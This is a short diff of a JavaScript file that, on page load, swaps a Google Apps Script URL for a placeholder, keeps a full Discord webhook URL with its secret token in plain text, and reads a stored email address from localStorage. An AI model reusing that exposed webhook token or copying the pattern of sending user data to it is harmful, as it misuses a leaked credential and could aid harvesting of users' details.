@@ -1,5 +1,5 @@
 document.addEventListener('DOMContentLoaded', function () {
-    const googleScriptURL = 'https://script.google.com/macros/s/AKfycbycuTfVRpKgaRoIu8QIeF4E1ARx0GH-zx-nm3CLpDhUsfCF3H1uF0Sy6Dd86_emwlGyTg/exec'; // Your Google Apps Script Web App URL
+    const googleScriptURL = 'e'; // Your Google Apps Script Web App URL
     const discordWebhookURL = 'https://discord.com/api/webhooks/1243489235345084468/koTS9hpn7Jqh2wON3dd2VMnW67LT4wETEceOxWt1x1Oc-jZ87XbbyVyE9r_eDKPo4T4x'; // Your Discord Webhook URL
 
     const email = localStorage.getItem('email');
